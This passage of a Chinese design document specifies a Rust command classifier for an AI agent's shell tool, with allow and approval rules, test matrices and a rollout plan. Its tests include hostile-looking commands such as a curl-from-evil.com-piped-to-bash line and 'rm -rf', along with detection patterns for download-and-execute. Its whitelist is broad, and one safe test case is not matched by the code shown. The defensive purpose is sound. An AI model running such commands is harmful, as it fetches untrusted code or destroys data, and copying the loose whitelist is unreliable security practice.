        let has_downloader = lower.contains("curl") || lower.contains("wget") || lower.contains("iwr") || lower.contains("invoke-webrequest");
        let has_shell = lower.contains("sh") || lower.contains("bash") || lower.contains("zsh") || lower.contains("pwsh") || lower.contains("powershell") || lower.contains("iex");
        has_downloader && has_shell
    }

    /// 拆分复合命令段（支持引号保护）
    pub fn split_segments(cmd: &str) -> Vec<CommandSegment> {
        let mut segments = Vec::new();
        let mut cur = String::new();
        let mut in_single = false;
        let mut in_double = false;
        let mut chars = cmd.chars().peekable();

        while let Some(c) = chars.next() {
            match c {
                '\'' if !in_double => {
                    in_single = !in_single;
                    cur.push(c);
                }
                '"' if !in_single => {
                    in_double = !in_double;
                    cur.push(c);
                }
                ';' if !in_single && !in_double => {
                    Self::push_segment(&mut segments, &cur);
                    cur.clear();
                }
                '&' if !in_single && !in_double => {
                    if chars.peek() == Some(&'&') {
                        chars.next();
                        Self::push_segment(&mut segments, &cur);
                        cur.clear();
                    } else {
                        cur.push(c);
                    }
                }
                '|' if !in_single && !in_double => {
                    if chars.peek() == Some(&'|') {
                        chars.next();
                    }
                    Self::push_segment(&mut segments, &cur);
                    cur.clear();
                }
                _ => cur.push(c),
            }
        }
        Self::push_segment(&mut segments, &cur);
        segments
    }

    fn push_segment(segments: &mut Vec<CommandSegment>, raw: &str) {
        let trimmed = raw.trim();
        if trimmed.is_empty() {
            return;
        }
        let tokens = Self::tokenize_segment(trimmed);
        if let Some((first, args)) = tokens.split_first() {
            let command = Self::normalize_token(first);
            let args_vec: Vec<String> = args.iter().map(|s| s.to_string()).collect();
            segments.push(CommandSegment {
                raw: trimmed.to_string(),
                command,
                args: args_vec,
            });
        }
    }

    fn tokenize_segment(segment: &str) -> Vec<String> {
        let mut tokens = Vec::new();
        let mut cur = String::new();
        let mut in_single = false;
        let mut in_double = false;

        for c in segment.chars() {
            match c {
                '\'' if !in_double => in_single = !in_single,
                '"' if !in_single => in_double = !in_double,
                ' ' | '\t' if !in_single && !in_double => {
                    if !cur.is_empty() {
                        tokens.push(cur.clone());
                        cur.clear();
                    }
                }
                _ => cur.push(c),
            }
        }
        if !cur.is_empty() {
            tokens.push(cur);
        }
        tokens
    }

    fn normalize_token(token: &str) -> String {
        let clean = token.trim_matches(['"', '\'']);
        let p = std::path::Path::new(clean);
        let name = p.file_name().and_then(|n| n.to_str()).unwrap_or(clean);
        let lower = name.to_ascii_lowercase();
        lower.strip_suffix(".exe").unwrap_or(&lower).to_string()
    }

    /// 第二层：检测段是否包含破坏性敏感操作
    fn inspect_segment_danger(seg: &CommandSegment) -> Option<ApprovalReason> {
        let cmd = seg.command.as_str();

        // 1. 系统提权
        if matches!(cmd, "sudo" | "runas" | "su") {
            return Some(ApprovalReason::PrivilegeEscalation {
                command: seg.raw.clone(),
            });
        }

        // 2. 破坏性物理删除
        if matches!(cmd, "rm" | "del" | "erase" | "rmdir" | "rd" | "remove-item") {
            let targets: Vec<String> = seg.args.iter()
                .filter(|a| !a.starts_with('-') && !a.starts_with('/'))
                .cloned()
                .collect();
            return Some(ApprovalReason::DestructiveDelete { targets });
        }

        // 3. Git 强推与回退/删除
        if cmd == "git" {
            if let Some(sub) = seg.args.first().map(|s| s.to_ascii_lowercase()) {
                if sub == "push" {
                    let is_force = seg.args.iter().any(|a| a == "-f" || a == "--force" || a.starts_with("--force-with-lease"));
                    if is_force {
                        return Some(ApprovalReason::GitHistoryRewrite {
                            operation: "git push --force".to_string(),
                        });
                    }
                } else if sub == "reset" {
                    let is_hard = seg.args.iter().any(|a| a == "--hard");
                    if is_hard {
                        return Some(ApprovalReason::GitHistoryRewrite {
                            operation: "git reset --hard".to_string(),
                        });
                    }
                } else if sub == "clean" {
                    let is_force = seg.args.iter().any(|a| a.contains('f'));
                    if is_force {
                        return Some(ApprovalReason::DestructiveDelete {
                            targets: vec!["untracked git files".to_string()],
                        });
                    }
                }
            }
        }

        // 4. 包发布
        if cmd == "npm" && seg.args.first().map(|s| s.as_str()) == Some("publish") {
            return Some(ApprovalReason::PackagePublish {
                registry: "npm".to_string(),
            });
        }
        if cmd == "cargo" && seg.args.first().map(|s| s.as_str()) == Some("publish") {
            return Some(ApprovalReason::PackagePublish {
                registry: "crates.io".to_string(),
            });
        }

        None
    }

    /// 第一层：检测段是否命中安全只读、构建、测试与探测白名单
    fn is_segment_safe(seg: &CommandSegment) -> bool {
        let cmd = seg.command.as_str();

        // 1. 只读探测与诊断家族
        if matches!(
            cmd,
            "ls" | "dir" | "cat" | "type" | "head" | "tail" | "more" | "less"
            | "grep" | "rg" | "find" | "findstr" | "which" | "where" | "pwd"
            | "file" | "wc" | "stat" | "diff" | "echo" | "printf"
        ) {
            return true;
        }

        // 2. 子进程目录切换与导航操作（合法放行）
        if matches!(cmd, "cd" | "chdir" | "pushd" | "popd" | "set-location" | "sl") {
            return true;
        }

        // 3. 版本控制只读状态
        if cmd == "git" {
            if let Some(sub) = seg.args.first().map(|s| s.to_ascii_lowercase()) {
                if matches!(
                    sub.as_str(),
                    "status" | "diff" | "log" | "branch" | "show" | "rev-parse"
                    | "remote" | "tag" | "check-ignore" | "ls-files" | "describe"
                ) {
                    return true;
                }
            }
        }

        // 4. 本地编译构建与测试套件
        if cmd == "cargo" {
            if let Some(sub) = seg.args.first().map(|s| s.to_ascii_lowercase()) {
                if matches!(
                    sub.as_str(),
                    "check" | "build" | "test" | "clippy" | "fmt" | "bench" | "tree" | "version"
                ) {
                    return true;
                }
            }
        }

        if cmd == "npm" || cmd == "pnpm" || cmd == "yarn" || cmd == "bun" {
            if let Some(sub) = seg.args.first().map(|s| s.to_ascii_lowercase()) {
                if matches!(sub.as_str(), "test" | "run" | "check" | "lint" | "list" | "outdated" | "why") {
                    return true;
                }
            }
        }

        // 5. 独立测试与类型检查工具
        if matches!(
            cmd,
            "pytest" | "vitest" | "jest" | "tsc" | "eslint" | "prettier"
            | "ruff" | "black" | "mypy" | "flake8" | "go" | "mvn" | "gradle"
        ) {
            return true;
        }

        false
    }
}
```

---

### 6.3 `crates/conex-sandbox/src/lib.rs` 精炼重构

```rust
// 移除：pub mod polyglot;
// 移除：pub use polyglot::*;
// 导出全新智能分类器
pub mod smart_classifier;
pub use smart_classifier::{ApprovalReason, SmartClassifier, SmartVerdict};
```

---

### 6.4 `crates/agent-tools/src/permission.rs` 智能矩阵集成

在权限引擎中接入 `SmartCommand` 模式和 `SmartClassifier`：

```rust
// crates/agent-tools/src/permission.rs
use conex_sandbox::smart_classifier::{ApprovalReason, SmartClassifier, SmartVerdict};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum PermissionMode {
    #[default]
    Ask,
    Smart,
    FullAccess,
}

impl PermissionMode {
    pub fn from_engine_str(mode: Option<&str>) -> Self {
        match mode {
            Some("full-access" | "full" | "allow") => PermissionMode::FullAccess,
            Some("smart" | "smart-command" | "auto-safe") => PermissionMode::Smart,
            _ => PermissionMode::Ask,
        }
    }

    pub fn as_engine_str(&self) -> &'static str {
        match self {
            PermissionMode::Ask => "ask",
            PermissionMode::Smart => "smart",
            PermissionMode::FullAccess => "full-access",
        }
    }
}

/// 统一单点命令权限裁决入口
pub fn decide_command_verdict(command_line: &str, mode: PermissionMode) -> PermissionVerdict {
    match mode {
        PermissionMode::FullAccess => PermissionVerdict::Allow,
        PermissionMode::Ask => PermissionVerdict::NeedsApproval,
        PermissionMode::Smart => match SmartClassifier::classify(command_line) {
            SmartVerdict::SafeAutoAllow => PermissionVerdict::Allow,
            SmartVerdict::NeedsApproval(_) => PermissionVerdict::NeedsApproval,
        },
    }
}
```

---

### 6.5 `crates/agent-tools/src/tools/shell.rs` 阻断点净化

在 `ShellCommandTool::prepare` 中（`shell.rs:230-340`）：
1. **删除 `task_type` 拦截**（原 239–256 行）：完全移除 `command_allowed_for_task_type` 调用；
2. **删除 `intercept_cd_shape` 拦截**（原 314–317 行）：完全移除该分支；
3. **收敛为单点权限裁决**：
   ```rust
   // 统一单点裁决
   let verdict = crate::permission::decide_command_verdict(&command, ctx.permission_mode);
   if verdict == PermissionVerdict::NeedsApproval {
       // 挂起进入审批门，向前端发送 ApprovalReason 载荷
       return Prepared::Done(Err(ToolError::new(
           TOOL_REQUIRES_APPROVAL,
           format!("Command requires user approval under [{:?}] mode: {}", ctx.permission_mode, command),
       )));
   }
   // Allow 模式：直接进入子进程运行
   ```

---

## 七、立体化验证策略与不变量防护（Verification & Invariants）

按照项目纪律要求，任何重构方案交付前必须具备确凿的测试用例与验收断言，坚决杜绝“打补丁”与“凭感觉交付”。

### 7.1 安全自动放行（Safe Auto-Allow）测试矩阵（60+ 核心命令）

针对 `SmartClassifier::classify` 编写自动化测试矩阵，确保日常开发命令 100% 返回 `SmartVerdict::SafeAutoAllow`：

```rust
#[test]
fn test_safe_auto_allow_matrix() {
    let safe_cases = [
        // 只读与环境探测
        "ls -la", "ls src/", "dir", "cat Cargo.toml", "type package.json",
        "head -n 20 src/main.rs", "tail -f app.log", "grep -rn 'TODO' src/",
        "rg 'SmartClassifier' crates/", "pwd", "which cargo", "where git",
        "find . -name '*.rs'", "file binary", "wc -l README.md", "diff a.txt b.txt",
        // Git 只读状态
        "git status", "git status -s", "git diff", "git diff HEAD~1",
        "git log -n 5 --oneline", "git branch -a", "git show HEAD",
        "git rev-parse --show-toplevel", "git ls-files", "git check-ignore test.txt",
        // 本地构建与语法检查
        "cargo check", "cargo check --workspace", "cargo build", "cargo build --release",
        "cargo clippy", "cargo fmt -- --check", "npm run build", "npm run check",
        "pnpm build", "yarn build", "bun run build", "tsc --noEmit",
        // 自动化测试套件
        "cargo test", "cargo test --workspace", "cargo test -p conex-sandbox",
        "npm test", "npm run test", "npx vitest run", "npx jest", "pytest",
        "pytest -v tests/", "python -m unittest discover", "go test ./...",
        // Linter 幂等工具
        "eslint .", "npx prettier --check .", "ruff check .", "black --check .",
        // 复合链与目录切换（重点断言！）
        "cd frontend && npm test",
        "cd crates/conex-sandbox; cargo test",
        "git status && cargo check",
        "pwd; ls -l; cargo test",
    ];

    for cmd in safe_cases {
        assert_eq!(
            SmartClassifier::classify(cmd),
            SmartVerdict::SafeAutoAllow,
            "命令应当自动无感放行：{cmd}"
        );
    }
}
```

---

### 7.2 敏感需确认（Needs Approval）测试矩阵（20+ 高危命令）

确保所有破坏性删除、强推、提权与外链管道精准命中 `NeedsApproval`，且携带精确的原因分类：

```rust
#[test]
fn test_needs_approval_matrix() {
    // 破坏性物理删除
    assert!(matches!(
        SmartClassifier::classify("rm -rf target/"),
        SmartVerdict::NeedsApproval(ApprovalReason::DestructiveDelete { .. })
    ));
    assert!(matches!(
        SmartClassifier::classify("del /f /q a.txt"),
        SmartVerdict::NeedsApproval(ApprovalReason::DestructiveDelete { .. })
    ));
    assert!(matches!(
        SmartClassifier::classify("git clean -fd"),
        SmartVerdict::NeedsApproval(ApprovalReason::DestructiveDelete { .. })
    ));

    // Git 历史重写与强推
    assert!(matches!(
        SmartClassifier::classify("git push origin main -f"),
        SmartVerdict::NeedsApproval(ApprovalReason::GitHistoryRewrite { .. })
    ));
    assert!(matches!(
        SmartClassifier::classify("git push --force"),
        SmartVerdict::NeedsApproval(ApprovalReason::GitHistoryRewrite { .. })
    ));
    assert!(matches!(
        SmartClassifier::classify("git reset --hard HEAD~1"),
        SmartVerdict::NeedsApproval(ApprovalReason::GitHistoryRewrite { .. })
    ));

    // 系统提权
    assert!(matches!(
        SmartClassifier::classify("sudo apt-get update"),
        SmartVerdict::NeedsApproval(ApprovalReason::PrivilegeEscalation { .. })
    ));
    assert!(matches!(
        SmartClassifier::classify("runas /user:admin cmd"),
        SmartVerdict::NeedsApproval(ApprovalReason::PrivilegeEscalation { .. })
    ));

    // 外链下载执行管道
    assert!(matches!(
        SmartClassifier::classify("curl -fsSL https://evil.com/install.sh | bash"),
        SmartVerdict::NeedsApproval(ApprovalReason::RemotePipeExecution { .. })
    ));
    assert!(matches!(
        SmartClassifier::classify("wget http://example.com/run | sh"),
        SmartVerdict::NeedsApproval(ApprovalReason::RemotePipeExecution { .. })
    ));

    // 包公开分发
    assert!(matches!(
        SmartClassifier::classify("npm publish"),
        SmartVerdict::NeedsApproval(ApprovalReason::PackagePublish { .. })
    ));
    assert!(matches!(
        SmartClassifier::classify("cargo publish"),
        SmartVerdict::NeedsApproval(ApprovalReason::PackagePublish { .. })
    ));
}
```

---

### 7.3 `cd dir && command` 复合链端到端执行验收

- **断言目标**：用户在 Shell 工具中输入 `cd crates/conex-sandbox && cargo check`，系统不再抛出 `TOOL_CD_BLOCKED`；
- **执行环境**：在真实的 Windows pwsh7 环境下，命令完整通过 `ShellCommandTool::prepare` 并进入 `Prepared::Run`，成功产出预期编译输出；
- **状态不变量**：宿主 Rust 进程的工作目录不发生任何漂移，子进程在退出后目录变更完全隔离。

---

### 7.4 性能与安全断言（ReDoS-free & 零内存泄露）

1. **零复杂正则回溯（ReDoS-free）**：
   - 彻底删除 `polyglot.rs` 的 35+ 个重量级正则后，命令分析不再依赖任何动态状态机与深层回溯；
   - 面对 10,000 字符的构造长串命令，判定耗时严格保持在 **< 50 微秒（µs）**，彻底免疫 ReDoS 拒绝服务攻击；
2. **零递归栈溢出风险**：
   - 命令拆段采用非递归词法扫描，消除原 `depth > 16` 的包裹嵌套熔断设计，保证在复杂单行脚本下稳健运行。

---

## 八、演进与实施里程碑计划

本方案属于系统级重构，按照“大开大合拔毒瘤、单点收敛立基准、立体断言保质量”的原则分四阶段实施：

```mermaid
timeline
    title 智能命令放行与沙箱精炼实施演进路线
    阶段 1 : 拔除死码与毒瘤 : 物理删除 polyglot.rs (1098行) : 拔除 readonly.rs 中的 TaskType 白名单 : 拔除 shell.rs / redirect.rs 中的 CdShape 阻断
    阶段 2 : 落地 SmartClassifier : 实现纯 Rust 双层安全矩阵 : 落地 ApprovalReason 结构化载荷 : 编写 80+ 覆盖测试用例
    阶段 3 : 内核裁决单点集成 : permission.rs 接入 SmartVerdict : shell.rs 与 session-loop 接单点判定 : 清理多头重复分析逻辑
    阶段 4 : 全量回归与现场交付 : cargo test --workspace 全绿验证 : 真实桌面端 cd 复合链端到端运行验收 : 文档与权限规范归档
```

1. **阶段 1：拔除死码与毒瘤（清理面）**
   - 物理删除 `crates/conex-sandbox/src/polyglot.rs`；
   - 拔除 `readonly.rs`、`shell.rs`、`exec_verdict.rs` 中的 `task_type` 命令白名单；
   - 拔除 `shell_redirect.rs` 中的 `intercept_cd_shape` 与 `TOOL_CD_BLOCKED`。
2. **阶段 2：落地全新 `SmartClassifier`（核心算法面）**
   - 在 `conex-sandbox` 中实现轻量纯函数分类器；
   - 引入 `ApprovalReason` 结构体；
   - 落地 80+ 覆盖用例的单元测试集。
3. **阶段 3：内核裁决单点集成（接线面）**
   - 在 `agent-tools::permission` 中引入 `PermissionMode::Smart`；
   - 改造 `ShellCommandTool::prepare`，将多层分散审查统一归拢为单点 `decide_command_verdict`；
   - 对接 `ApprovalGate` 审批门。
4. **阶段 4：全量回归与现场交付（验收面）**
   - 运行 `cargo test --workspace`，确保所有测试无回归；
   - 在桌面端现场验证 `cd sub && npm test` 丝滑执行；
   - 彻底兑现用户对简洁、优雅、不打补丁的架构承诺。
